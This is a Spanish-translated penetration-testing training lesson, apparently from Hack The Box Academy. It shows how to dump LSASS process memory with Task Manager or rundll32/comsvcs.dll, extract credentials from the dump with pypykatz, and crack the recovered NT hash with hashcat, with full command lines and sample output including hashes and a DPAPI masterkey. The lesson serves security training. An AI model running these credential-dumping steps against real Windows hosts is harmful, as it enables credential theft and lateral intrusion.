# Atacando a LSASS

Además de obtener copias de la base de datos SAM para descargar y descifrar hashes, también nos beneficiaremos de dirigirse a LSASS. Como se discutió en el`Credential Storage`Sección de este módulo, LSASS es un servicio crítico que juega un papel central en la gestión de credenciales y los procesos de autenticación en todos los sistemas operativos de Windows.

![](https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png)

Tras el inicio de sesión inicial, LSASS:

- Credenciales de caché localmente en la memoria
- Crear[tokens de acceso](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Hacer cumplir las políticas de seguridad
- Escribe en Windows[registro de seguridad](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Cubra algunas de las técnicas y herramientas que podemos usar para descargar la memoria de LSASS y extraer credenciales de un objetivo que ejecuta Windows.

---

# **Dumping Memoria del proceso LSASS**

Similar al proceso de atacar la base de datos SAM, con LSASS, sería prudente para nosotros crear primero una copia del contenido de la memoria del proceso LSASS a través de la generación de un volcado de memoria. Crear un archivo de volcado nos permite extraer credenciales fuera de línea utilizando nuestro host de ataque. Tenga en cuenta que realizar ataques fuera de línea nos da más flexibilidad en la velocidad de nuestro ataque y requiere menos tiempo en el sistema objetivo. Hay innumerables métodos que podemos usar para crear un volcado de memoria. Cubra las técnicas que se pueden realizar utilizando herramientas ya integradas en Windows.

### **Método del administrador de tareas**

Con el acceso a una sesión gráfica interactiva con el objetivo, podemos usar el administrador de tareas para crear un volcado de memoria. Esto requiere que nosotros:

![](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

Un archivo llamado`lsass.DMP`se crea y se guarda en:

Atacando a LSASS

```
C:\Users\loggedonusersdirectory\AppData\Local\Temp

```

Este es el archivo que transferiremos a nuestro host de ataque. Podemos usar el método de transferencia de archivos discutido en el`Attacking SAM`Sección de este módulo para transferir el archivo de volcado a nuestro host de ataque.

### **Rundll32.exe & comsvcs.dll método**

El método del administrador de tareas depende de que tengamos una sesión interactiva basada en GUI con un objetivo. Podemos usar un método alternativo para descargar la memoria de proceso LSASS a través de una utilidad de línea de comandos llamado[rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). De esta manera, es más rápida que el método del administrador de tareas y es más flexible porque podemos obtener una sesión de shell en un host de Windows con solo acceso a la línea de comandos. Es importante tener en cuenta que las herramientas antivirus modernas reconocen este método como actividad maliciosa.

Antes de emitir el comando para crear el archivo de volcado, debemos determinar qué ID de proceso (`PID`) se asigna a`lsass.exe`. Esto se puede hacer desde CMD o PowerShell:

### **Encontrar lSass PID en CMD**

Desde CMD, podemos emitir el comando`tasklist /svc`y encuentre lSass.exe y su ID de proceso en el campo PID.

Atacando a LSASS

```
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A

```

### **Encontrar lSass Pid en PowerShell**

De PowerShell, podemos emitir el comando`Get-Process lsass`y vea la identificación del proceso en el`Id`campo.

Atacando a LSASS

```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass

```

Una vez que tenemos el PID asignado al proceso LSASS, podemos crear el archivo de volcado.

### **Creación de lsass.dmp usando PowerShell**

Con una sesión elevada de PowerShell, podemos emitir el siguiente comando para crear el archivo de volcado:

Atacando a LSASS

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

```

Con este comando, estamos ejecutando`rundll32.exe`para llamar a una función exportada de`comsvcs.dll`que también llama al minidumpwritedump (`MiniDump`) Funciona para volcar la memoria del proceso LSASS a un directorio especificado (`C:\lsass.dmp`). Recuerde que la mayoría de las herramientas AV más modernas reconocen esto como malicioso y evita que el comando se ejecute. En estos casos, deberemos considerar formas de omitir o deshabilitar la herramienta AV que enfrentamos. Las técnicas de omisión AV están fuera del alcance de este módulo.

Si logramos ejecutar este comando y generar el`lsass.dmp`Archivo, podemos proceder a transferir el archivo a nuestro cuadro de ataque para intentar extraer cualquier credencial que pueda haberse almacenado en la memoria del proceso LSASS.

Nota: Podemos usar el método de transferencia de archivos discutido en la sección SAM de ataque para obtener el archivo LSASS.DMP del objetivo a nuestro host de ataque.

---

# **Uso de pypykatz para extraer credenciales**

Una vez que tenemos el archivo de volcado en nuestro host de ataque, podemos usar una herramienta poderosa llamada[pypykatz](https://github.com/skelsec/pypykatz)Intentar extraer credenciales del archivo .dmp. Pypykatz es una implementación de Mimikatz escrito completamente en Python. El hecho de que esté escrito en Python nos permite ejecutarlo en hosts de ataque con sede en Linux. En el momento de este escrito, Mimikatz solo se ejecuta en los sistemas de Windows, por lo que para usarlo, necesitaríamos usar un host de ataque de Windows o tendríamos que ejecutar Mimikatz directamente en el objetivo, lo que no es un escenario ideal. Esto hace que Pypykatz sea una alternativa atractiva porque todo lo que necesitamos es una copia del archivo de volcado, y podemos ejecutarlo sin conexión desde nuestro host de ataque basado en Linux.

Recuerde que LSASS almacena credenciales que tienen sesiones de inicio de sesión activas en los sistemas de Windows. Cuando arrojamos la memoria del proceso LSASS en el archivo, esencialmente tomamos una "instantánea" de lo que estaba en la memoria en ese momento. Si hubo alguna sesión de inicio de sesión activa, las credenciales utilizadas para establecerlas estarán presentes. Ejecutemos pypykatz contra el archivo de volcado y descubramos.

### **Ejecutando pypykatz**

El comando inicia el uso de`pypykatz`Para analizar los secretos ocultos en el volcado de memoria del proceso LSASS. Usamos`lsa`en el comando porque LSASS es un subsistema de`local security authority`, luego especificamos la fuente de datos como un`minidump`archivo, procedido por la ruta al archivo de volcado (`/home/peter/Documents/lsass.dmp`) almacenado en nuestro anfitrión de ataque. Pypykatz analiza el archivo de volcado y genera los hallazgos:

Atacando a LSASS

```
xnoxos@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)

```

Veamos una visión más detallada de la información útil en la salida.

### **MSV**

Atacando a LSASS

```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA

```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package)es un paquete de autenticación en Windows que LSA pide para validar los intentos de inicio de sesión en la base de datos SAM. Pypykatz extrajo el`SID`, `Username`, `Domain`, e incluso el`NT` & `SHA1`Hashes de contraseña asociados con la sesión de inicio de sesión de la cuenta de usuario de BOB almacenada en la memoria de proceso LSASS. Esto resultará útil en la etapa final de nuestro ataque cubierto al final de esta sección.

### **Wdigest**

Atacando a LSASS

```
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

```

`WDIGEST`es un protocolo de autenticación anterior habilitado de forma predeterminada en`Windows XP` - `Windows 8`y`Windows Server 2003` - `Windows Server 2012`. LSASS Caches Credenciales utilizadas por WDigest en Texto Clear. Esto significa que si nos encontramos dirigidos a un sistema de Windows con WDigest habilitado, lo más probable es que veamos una contraseña en Texto Clear. Los sistemas operativos modernos de Windows tienen WDigest deshabilitado de forma predeterminada. Además, es esencial tener en cuenta que Microsoft lanzó una actualización de seguridad para los sistemas afectados por este problema con WDIGEST. Podemos estudiar los detalles de esa actualización de seguridad[aquí](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

### **Kerberos**

Atacando a LSASS

```
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54

```

[Kerberos](https://web.mit.edu/kerberos/#what_is)es un protocolo de autenticación de red utilizado por Active Directory en entornos de dominio de Windows. Las cuentas de los usuarios de dominio se les otorgan boletos al autenticación con Active Directory. Este boleto se utiliza para permitir al usuario acceder a recursos compartidos en la red a la que se les ha otorgado acceso sin necesidad de escribir sus credenciales cada vez. LSass`caches passwords`, `ekeys`, `tickets`, y`pins`asociado con Kerberos. Es posible extraerlos de la memoria de proceso LSASS y usarlas para acceder a otros sistemas unidos al mismo dominio.

### **Dpapi**

Atacando a LSASS

```
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

```

La interfaz de programación de aplicaciones de protección de datos o[Dpapi](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)es un conjunto de API en los sistemas operativos de Windows utilizados para cifrar y descifrar las blobs de datos DPAPI por usuario para las características del sistema operativo de Windows y varias aplicaciones de terceros. Estos son solo algunos ejemplos de aplicaciones que usan DPAPI y para qué lo usan:

| **Aplicaciones** | **Uso de DPAPI** |
| --- | --- |
| `Internet Explorer` | Formulario de contraseña Datos de combustión automática (nombre de usuario y contraseña para sitios guardados). |
| `Google Chrome` | Formulario de contraseña Datos de combustión automática (nombre de usuario y contraseña para sitios guardados). |
| `Outlook` | Contraseñas para cuentas de correo electrónico. |
| `Remote Desktop Connection` | Credenciales guardadas para conexiones a máquinas remotas. |
| `Credential Manager` | Credenciales guardadas para acceder a recursos compartidos, unirse a redes inalámbricas, VPN y más. |

Mimikatz y Pypykatz pueden extraer el dpapi`masterkey`para el usuario registrado cuyos datos están presentes en la memoria de proceso LSASS. Esta tecla maestra se puede usar para descifrar los secretos asociados con cada una de las aplicaciones que usan DPAPI y dar como resultado la captura de credenciales para varias cuentas. Las técnicas de ataque de DPAPI se cubren con mayor detalle en el[Escalada de privilegios de Windows](https://academy.hackthebox.com/module/details/67)módulo.

### **Rompiendo el hash NT con el hashcat**

Ahora podemos usar hashcat para descifrar el hash NT. En este ejemplo, solo encontramos un hash NT asociado con el usuario de Bob, lo que significa que no necesitaremos crear una lista de hash como lo hicimos en el`Attacking SAM`sección de este módulo. Después de configurar el modo en el comando, podemos pegar el hash, especificar una lista de palabras y luego romper el hash.

Atacando a LSASS

```
xnoxos@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt64f12cddaa88057e06a81b54e73b949b:Password1

```

Nuestro intento de agrietamiento se completa, y nuestro ataque general puede considerarse un éxito.